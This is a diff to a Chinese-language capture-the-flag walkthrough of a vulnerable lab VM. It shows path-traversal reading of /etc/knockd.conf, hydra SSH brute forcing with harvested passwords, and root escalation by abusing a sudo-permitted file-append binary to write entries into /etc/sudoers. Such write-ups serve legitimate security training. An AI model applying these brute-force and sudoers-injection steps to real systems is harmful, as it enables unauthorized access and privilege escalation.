@@ -491,7 +491,7 @@ runnable tasks:
 ![image-20210506154327556](image-20210506154327556.png)
 
 ~~~markdown
-knockd进程是在这里找到的,还有sshd等,其他不太重要,这里直接cat knockd.conf,完犊子我也不知道代佬为什么直接读取 ../../../../../../..//etc/knockd.conf,留个疑问.*?
+knockd进程是在这里找到的,还有sshd等,其他不太重要,这里直接cat knockd.conf,完犊子我也不知道代佬为什么直接读取 ../../../../../../../etc/knockd.conf,留个疑问.*?
 
 这里读取文件如下
 ~~~
@@ -525,6 +525,99 @@ hydra -L user -P password ssh://192.168.81.131
 chandlerb	  password: UrAG0D!
 joeyt 		  password: Passw0rd
 janitor 	  password: Ilovepeepee
-
+分别对这三个账户登录, 查看用户目录下的文件,可以看到janitor主目录下有隐藏的password文件
 ~~~
+
+![image-20210507141455176](image-20210507141455176.png)
+
+~~~markdown
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+
+利用这些密码对剩下的几个用户尝试爆破
+hydra -L user.txt -P sec_pass ssh://192.168.81.131 得到新用户 fredf 密码 B4-Tru3-001
+~~~
+
+![image-20210507143242286](image-20210507143242286.png)
+
+~~~markdown
+hint: 登录每个用户后查看sudo -l ,看每个用户sudo能执行的文件
+这里我就不都做演示了,可以看到fredf可以执行文件/opt/devstuff/dist/test/test
+~~~
+
+![image-20210507151159478](image-20210507151159478.png)
+
+~~~markdown
+这里less 一下目标文件,可以看到是elf
+~~~
+
+![image-20210507151430883](image-20210507151430883.png)
+
+~~~markdown
+cd 到devstuff,可以看到有test.py
+~~~
+
+![image-20210507151716935](image-20210507151716935.png)
+
+~~~python
+读取test.py
+#!/usr/bin/python
+
+import sys
+
+if len (sys.argv) != 3 :
+    print ("Usage: python test.py read append")
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], "r")
+    output = (f.read())
+
+    f = open(sys.argv[2], "a")
+    f.write(output)
+    f.close()
+
+ 意思很简单,传入参数个数等于2时,才执行else里边的代码
+ python test.py arg1 arg2
+    读取arg1的文件内容,写入arg2文件
+ 
+#由于这个py可以写入任何文件,所以任何跟提权相关的文件都可以作为跳板
+~~~
+
+### 5. 提权
+
+#### 1. sudoer
+
+~~~markdown
+Linux默认是没有将用户添加到sudoers列表中的，需要root手动将账户添加到sudoers列表中，才能让普通账户执行sudo命令。
+这是kali上的sudoer ,思路即将 joeyt    ALL=(ALL:ALL) ALL 添加到文件里即可
+~~~
+
+![image-20210507153201667](image-20210507153201667.png)
+
+~~~markdown
+vi demo 内容
+joeyt    ALL=(ALL:ALL) ALL 
+fredf    ALL=(ALL:ALL) ALL
+将demo写入到sudoers
+opt/devstuff/dist/test$ test /tmp/demo /etc/sudoers 
+
+写入后 sudo bash 即可进入root 提权成功
+~~~
+
+![image-20210507160439730](image-20210507160439730.png)
+
+#### 2.openssl passwd
+
+```markdown
+另一种方式是直接新建一个用户写入passwd提权,明天结束
+```
+
+
+
+
 
